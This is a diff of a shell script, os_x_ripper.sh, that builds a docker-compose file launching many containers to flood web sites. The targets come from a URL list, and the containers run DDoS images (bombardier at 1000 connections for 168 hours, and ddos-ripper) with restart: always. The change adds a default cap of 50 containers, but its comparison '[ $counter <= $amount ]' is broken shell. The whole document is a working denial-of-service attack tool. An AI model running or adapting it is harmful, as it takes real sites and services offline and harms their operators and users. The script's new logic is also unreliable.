@@ -5,6 +5,7 @@ VERSION='1.0'
 
 TARGETS_URL='https://raw.githubusercontent.com/jeka-mel/bump/main/urls.txt'
 
+
 print_help () {
   echo "Usage: os_x_ripper.sh --file urls.txt"
   echo "--file|-f - filename where urls are located"
@@ -29,31 +30,43 @@ check_params () {
 }
 
 generate_compose_light () {
+  if [ -z ${amount} ]; then
+    echo -e "Amount of containers not set, setting to maximum of 50"
+    amount=50
+  fi
   echo "version: '3'" > docker-compose.yml
   echo "services:" >> docker-compose.yml
   counter=1
   while read -r site_url; do
-    if [ ! -z $site_url ]; then
-      echo "  ddos-runner-$counter:" >> docker-compose.yml
-      echo "    image: alpine/bombardier:latest" >> docker-compose.yml
-      echo "    restart: always" >> docker-compose.yml
-      echo "    command: -c 1000 -d 168h $site_url" >> docker-compose.yml
-      counter=$((counter+1))
+    if [ $counter <= $amount ]; then
+        if [ ! -z $site_url ]; then
+          echo "  ddos-runner-$counter:" >> docker-compose.yml
+          echo "    image: alpine/bombardier:latest" >> docker-compose.yml
+          echo "    restart: always" >> docker-compose.yml
+          echo "    command: -c 1000 -d 168h $site_url" >> docker-compose.yml
+          counter=$((counter+1))
+        fi
     fi
   done < urls.txt
 }
 
 generate_compose () {
+  if [ -z ${amount} ]; then
+    echo -e "Amount of containers not set, setting to maximum of 50"
+    amount=50
+  fi
   echo "version: '3'" > docker-compose.yml
   echo "services:" >> docker-compose.yml
   counter=1
   while read -r site_url; do
-    if [ ! -z $site_url ]; then
-        echo "  ddos-runner-$counter:" >> docker-compose.yml
-        echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-        echo "    restart: always" >> docker-compose.yml
-        echo "    command: $site_url" >> docker-compose.yml
-        counter=$((counter+1))
+    if [ $counter <= $amount ]; then
+      if [ ! -z $site_url ]; then
+          echo "  ddos-runner-$counter:" >> docker-compose.yml
+          echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+          echo "    restart: always" >> docker-compose.yml
+          echo "    command: $site_url" >> docker-compose.yml
+          counter=$((counter+1))
+      fi
     fi
   done < urls.txt
 }
